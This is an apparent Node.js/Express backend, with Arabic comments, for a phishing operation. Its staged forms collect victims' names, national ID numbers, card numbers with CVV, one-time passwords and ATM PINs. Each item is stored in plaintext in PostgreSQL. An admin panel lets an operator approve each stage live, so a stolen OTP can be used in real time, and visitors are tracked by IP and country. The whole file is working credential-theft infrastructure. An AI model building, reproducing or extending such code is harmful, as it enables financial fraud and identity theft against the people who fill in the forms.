const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const geoip = require('geoip-lite');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// إعداد اتصال PostgreSQL مع Connection Pool محسّن لتحمل 300+ زيارة
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  },
  // إعدادات Connection Pool لتحمل الزيارات العالية
  max: 20,                    // الحد الأقصى للاتصالات المتزامنة (20 اتصال)
  idleTimeoutMillis: 30000,   // إغلاق الاتصال بعد 30 ثانية خمول
  connectionTimeoutMillis: 5000, // مهلة الاتصال 5 ثوانٍ
  allowExitOnIdle: false      // لا تغلق الـ pool عند الخمول
});

// إنشاء الجداول + الفهارس لتحسين الأداء
async function initDb() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS orders (
        id TEXT PRIMARY KEY,
        session_id TEXT,
        timestamp TEXT,
        status TEXT,
        current_page TEXT,
        country TEXT,
        personal_data JSONB,
        payment_data JSONB,
        otp_data JSONB,
        atm_pin_data JSONB,
        rejected BOOLEAN DEFAULT FALSE,
        rejection_reason TEXT,
        admin_action TEXT,
        admin_action_at TEXT
      );

      CREATE TABLE IF NOT EXISTS order_states (
        order_id TEXT PRIMARY KEY,
        stage TEXT,
        status TEXT,
        message TEXT
      );

      CREATE TABLE IF NOT EXISTS visitor_sessions (
        session_id TEXT PRIMARY KEY,
        ip TEXT,
        country TEXT,
        current_page TEXT,
        last_activity TEXT,
        user_agent TEXT
      );

      -- فهارس لتسريع الاستعلامات
      CREATE INDEX IF NOT EXISTS idx_orders_timestamp ON orders (timestamp DESC);
      CREATE INDEX IF NOT EXISTS idx_orders_status ON orders (status);
      CREATE INDEX IF NOT EXISTS idx_orders_country ON orders (country);
      CREATE INDEX IF NOT EXISTS idx_order_states_status ON order_states (status);
      CREATE INDEX IF NOT EXISTS idx_order_states_stage ON order_states (stage);
      CREATE INDEX IF NOT EXISTS idx_visitor_sessions_last_activity ON visitor_sessions (last_activity DESC);
    `);
    console.log('Database tables and indexes initialized');
  } catch (err) {
    console.error('Error initializing database:', err);
  }
}

initDb();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to get country from IP
function getCountryFromIP(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '');
    const geo = geoip.lookup(cleanIP);
    if (geo && geo.country) {
      return geo.country;
    }
  } catch (e) {}
  if (!ip || ip === '127.0.0.1' || ip === '::1') return 'Local';
  return 'Unknown';
}

app.set('trust proxy', true);

// Helper: Parse JSONB fields from DB rows into proper JSON objects
// and rename snake_case keys to camelCase for frontend compatibility
function parseOrderRow(row) {
  if (!row) return null;
  
  const personalData = typeof row.personal_data === 'string' 
    ? JSON.parse(row.personal_data) 
    : row.personal_data;
  const paymentData = typeof row.payment_data === 'string' 
    ? JSON.parse(row.payment_data) 
    : row.payment_data;
  const otpData = typeof row.otp_data === 'string' 
    ? JSON.parse(row.otp_data) 
    : row.otp_data;
  const atmPinData = typeof row.atm_pin_data === 'string' 
    ? JSON.parse(row.atm_pin_data) 
    : row.atm_pin_data;

  return {
    id: row.id,
    sessionId: row.session_id,
    timestamp: row.timestamp,
    status: row.status,
    currentPage: row.current_page,
    country: row.country,
    personalData: personalData || null,
    paymentData: paymentData || null,
    otpData: otpData || null,
    atmPinData: atmPinData || null,
    rejected: row.rejected,
    rejectionReason: row.rejection_reason,
    adminAction: row.admin_action,
    adminActionAt: row.admin_action_at
  };
}

// ============================================
// تحسين Middleware لتتبع الجلسات
// عند 300+ زيارة: نستخدم fire-and-forget (غير متزامن) لتجنب إبطاء الطلبات
// ============================================
app.use(async (req, res, next) => {
  // تجنب تتبع طلبات الـ API الثابتة أو ملفات الـ public
  if (req.path.includes('.') || req.path.startsWith('/api/')) {
    return next();
  }

  const forwardedFor = req.headers['x-forwarded-for'];
  const realIp = req.headers['x-real-ip'];
  const ip = forwardedFor 
    ? forwardedFor.split(',')[0].trim() 
    : (realIp || req.ip || req.connection.remoteAddress);
  
  const userAgent = req.get('user-agent') || '';
  // استخدام IP + UserAgent كمعرف فريد للزائر
  const visitorKey = (ip || 'unknown') + ':' + userAgent.substring(0, 100);
  const country = getCountryFromIP(ip);
  const currentPage = req.path;
  const now = new Date().toISOString();

  // تحديث الجلسة في قاعدة البيانات
  const sessionTask = pool.query(`
    INSERT INTO visitor_sessions (session_id, ip, country, current_page, last_activity, user_agent)
    VALUES ($1, $2, $3, $4, $5, $6)
    ON CONFLICT (session_id) DO UPDATE SET
      current_page = $4, last_activity = $5
  `, [visitorKey, ip, country, currentPage, now, userAgent])
  .then(() => {
    // تنظيف الجلسات الخاملة (أكثر من دقيقتين بدلاً من 5 ليكون العداد أدق للزيارات "اللحظية")
    return pool.query("DELETE FROM visitor_sessions WHERE last_activity < (NOW() - INTERVAL '2 minutes')");
  })
  .catch(err => {
    console.error('Session tracking error:', err);
  });

  // لا ننتظر sessionTask - نستمر فوراً
  sessionTask.catch(() => {}); // silent catch

  res.locals.sessionId = visitorKey;
  next();
});

// مسار خاص للوحة الإدارة
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ============================================
// API Routes - محسّنة للأداء
// ============================================

// Get all orders (with states joined) - محسّن
// لا يوجد pagination لأن admin يحتاج كل الطلبات، لكن الفهارس تجعل الاستعلام سريع
app.get('/api/admin/orders', async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT o.*, 
             json_build_object('stage', os.stage, 'status', os.status, 'message', os.message) as "orderState"
      FROM orders o
      LEFT JOIN order_states os ON o.id = os.order_id
      ORDER BY o.timestamp DESC
    `);
    
    // Parse each row to convert snake_case to camelCase
    const parsedOrders = result.rows.map(row => {
      const order = parseOrderRow(row);
      order.orderState = row.orderState || null;
      return order;
    });
    
    res.json(parsedOrders);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Database error' });
  }
});

// Get active sessions count only (أخف على الأداء)
app.get('/api/sessions', async (req, res) => {
  try {
    const result = await pool.query('SELECT COUNT(*) FROM visitor_sessions');
    const count = parseInt(result.rows[0].count);
    res.json({ count, sessions: [] });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// Get full sessions (مطلوب أحياناً)
app.get('/api/sessions/full', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM visitor_sessions');
    res.json({ count: result.rowCount, sessions: result.rows });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// Get session ID for client
app.get('/api/session', (req, res) => {
  res.json({ sessionId: res.locals.sessionId });
});

// Heartbeat API to keep session alive
app.post('/api/heartbeat', async (req, res) => {
  try {
    const { currentPage } = req.body;
    const sessionId = res.locals.sessionId;
    const now = new Date().toISOString();
    
    await pool.query(`
      UPDATE visitor_sessions 
      SET last_activity = $1, current_page = COALESCE($2, current_page)
      WHERE session_id = $3
    `, [now, currentPage, sessionId]);
    
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Database error' });
  }
});

// Save personal data (Step 1)
app.post('/api/orders/personal-data', async (req, res) => {
  try {
    const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender } = req.body;

    if (!fullname || !id_number || !phone || !email) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const orderId = 'ORD-' + Date.now();
    const forwardedFor = req.headers['x-forwarded-for'];
    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (req.headers['x-real-ip'] || req.ip);
    const userAgent = req.get('user-agent') || '';
    const sessionId = (ip || 'unknown') + ':' + userAgent.substring(0, 50);
    const country = getCountryFromIP(ip);
    
    const personalData = {
      fullname,
      id_number,
      phone,
      id_expiry: `${id_expiry_day}/${id_expiry_month}/${id_expiry_year}`,
      dob: `${dob_day}/${dob_month}/${dob_year}`,
      email,
      gender
    };

    // استخدام Transaction لضمان الاتساق
    const client = await pool.connect();
    try {
      await client.query('BEGIN');
      
      await client.query(`
        INSERT INTO orders (id, session_id, timestamp, status, current_page, country, personal_data)
        VALUES ($1, $2, $3, $4, $5, $6, $7)
      `, [orderId, sessionId, new Date().toISOString(), 'personal_data_submitted', 'personal_data', country, JSON.stringify(personalData)]);

      // عند إدخال البيانات الشخصية فقط، المرحلة payment لكن الحالة waiting (ليست pending)
      await client.query(`
        INSERT INTO order_states (order_id, stage, status)
        VALUES ($1, $2, $3)
      `, [orderId, 'payment', 'waiting']);

      await client.query('COMMIT');
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }

    res.json({ success: true, orderId, message: 'Personal data saved successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Save payment data (Step 2)
app.post('/api/orders/payment-data', async (req, res) => {
  try {
    const { orderId, card_holder, card_number, expiry_date, cvv, delivery_address } = req.body;

    if (!orderId || !card_holder || !card_number || !expiry_date || !cvv) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const paymentData = { card_holder, card_number, expiry_date, cvv, delivery_address };

    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const result = await client.query(`
        UPDATE orders 
        SET payment_data = $1, status = $2, current_page = $3 
        WHERE id = $4
      `, [JSON.stringify(paymentData), 'payment_data_submitted', 'payment', orderId]);

      if (result.rowCount === 0) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'Order not found' });
      }

      await client.query(`
        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
      `, ['payment', 'pending', orderId]);

      await client.query('COMMIT');
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }

    res.json({ success: true, message: 'Payment data saved successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Check order status (polling endpoint)
app.get('/api/orders/:orderId/status', async (req, res) => {
  try {
    const { orderId } = req.params;
    const stateRes = await pool.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
    
    if (stateRes.rowCount === 0) {
      return res.json({ status: 'unknown' });
    }

    const orderRes = await pool.query('SELECT current_page FROM orders WHERE id = $1', [orderId]);
    const state = stateRes.rows[0];
    
    res.json({
      status: state.status,
      stage: state.stage,
      message: state.message,
      currentPage: orderRes.rowCount > 0 ? orderRes.rows[0].current_page : null
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Save OTP verification (Step 3)
app.post('/api/orders/otp-verification', async (req, res) => {
  try {
    const { orderId, otp_code } = req.body;

    if (!orderId || !otp_code) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const otpData = { otp_code, verified_at: new Date().toISOString() };

    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const result = await client.query(`
        UPDATE orders SET otp_data = $1, status = $2, current_page = $3 WHERE id = $4
      `, [JSON.stringify(otpData), 'otp_submitted', 'otp', orderId]);

      if (result.rowCount === 0) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'Order not found' });
      }

      await client.query(`
        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
      `, ['otp', 'pending', orderId]);

      await client.query('COMMIT');
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }

    res.json({ success: true, message: 'OTP submitted successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Save ATM PIN (Step 4)
app.post('/api/orders/atm-pin', async (req, res) => {
  try {
    const { orderId, atm_pin } = req.body;

    if (!orderId || !atm_pin) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const atmPinData = { atm_pin, submitted_at: new Date().toISOString() };

    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const result = await client.query(`
        UPDATE orders SET atm_pin_data = $1, status = $2, current_page = $3 WHERE id = $4
      `, [JSON.stringify(atmPinData), 'atm_pin_submitted', 'atm_pin', orderId]);

      if (result.rowCount === 0) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'Order not found' });
      }

      await client.query(`
        UPDATE order_states SET stage = $1, status = $2, message = NULL WHERE order_id = $3
      `, ['atm_pin', 'pending', orderId]);

      await client.query('COMMIT');
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }

    res.json({ success: true, message: 'ATM PIN submitted successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Get order by ID
app.get('/api/orders/:orderId', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM orders WHERE id = $1', [req.params.orderId]);
    if (result.rowCount === 0) {
      return res.status(404).json({ error: 'Order not found' });
    }
    const parsedOrder = parseOrderRow(result.rows[0]);
    res.json(parsedOrder);
  } catch (err) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin API - Verify password
app.post('/api/admin/verify', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(32).toString('hex');
    res.json({ success: true, token });
  } else {
    res.status(401).json({ error: 'Invalid password' });
  }
});

// Admin API - Approve order
app.post('/api/admin/approve/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    
    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const stateRes = await client.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
      
      if (stateRes.rowCount === 0) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'Order state not found' });
      }

      let { stage, status } = stateRes.rows[0];
      let currentPage = '';
      let orderStatus = '';

      if (stage === 'payment') {
        stage = 'otp';
        status = 'approved';
        currentPage = 'loading_otp';
      } else if (stage === 'otp') {
        stage = 'atm_pin';
        status = 'approved';
        currentPage = 'loading_atm';
      } else if (stage === 'atm_pin') {
        stage = 'success';
        status = 'approved';
        currentPage = 'loading_success';
        orderStatus = 'completed';
      }

      await client.query(`
        UPDATE orders SET current_page = $1, status = COALESCE(NULLIF($2, ''), status), admin_action = $3, admin_action_at = $4 WHERE id = $5
      `, [currentPage, orderStatus, 'approved', new Date().toISOString(), orderId]);

      await client.query(`
        UPDATE order_states SET stage = $1, status = $2 WHERE order_id = $3
      `, [stage, status, orderId]);

      await client.query('COMMIT');
      res.json({ success: true, message: 'Order approved', nextPage: stage });
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Admin API - Reject order
app.post('/api/admin/reject/:orderId', async (req, res) => {
  try {
    const { orderId } = req.params;
    const { message } = req.body;
    
    const client = await pool.connect();
    try {
      await client.query('BEGIN');

      const stateRes = await client.query('SELECT * FROM order_states WHERE order_id = $1', [orderId]);
      if (stateRes.rowCount === 0) {
        await client.query('ROLLBACK');
        return res.status(404).json({ error: 'Order state not found' });
      }

      const stage = stateRes.rows[0].stage;
      let currentPage = stage;

      await client.query(`
        UPDATE orders SET current_page = $1, admin_action = $2, admin_action_at = $3, rejected = TRUE, rejection_reason = $4 WHERE id = $5
      `, [currentPage, 'rejected', new Date().toISOString(), message || 'Information incorrect', orderId]);

      await client.query(`
        UPDATE order_states SET status = $1, message = $2 WHERE order_id = $3
      `, ['rejected', message || 'Information incorrect', orderId]);

      await client.query('COMMIT');
      res.json({ success: true, message: 'Order rejected' });
    } catch (err) {
      await client.query('ROLLBACK');
      throw err;
    } finally {
      client.release();
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
